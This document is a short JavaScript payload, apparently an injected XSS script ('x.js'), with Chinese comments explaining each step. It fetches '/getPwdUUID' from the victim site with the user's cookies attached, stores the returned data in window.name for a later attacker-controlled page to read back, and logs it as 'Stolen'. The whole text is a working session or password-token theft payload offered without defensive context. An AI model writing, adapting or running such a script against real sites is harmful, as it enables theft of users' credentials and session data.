(async () => {                                                                                                                                                                
    try {                                                                                                                                                                       
      // 1. 同源请求,自动携带目标站点 Cookie(关键一步,不需要 CORS)                                                                                                              
      const resp = await fetch('/getPwdUUID?jsonpname=q', { credentials: 'same-origin' });                                                                                      
      const data = await resp.text();                                                                                                                                           
                                                                                                                                                                                
      // 2. 写入 window.name,攻击者后续在同一个标签页打开自己的页面读回                                                                                                         
      window.name = 'SID:' + data;                                                                                                                                              
      console.log('[+] Stolen len=' + data.length + ':', data.slice(0, 200));                                                                                                   
    } catch (e) {                                                                                                                                                               
      console.error('[!] x.js error:', e);                                                                                                                                      
      window.name = 'ERR:' + (e && e.message);                                                                                                                                  
    }                                                                                                                                                                           
  })();
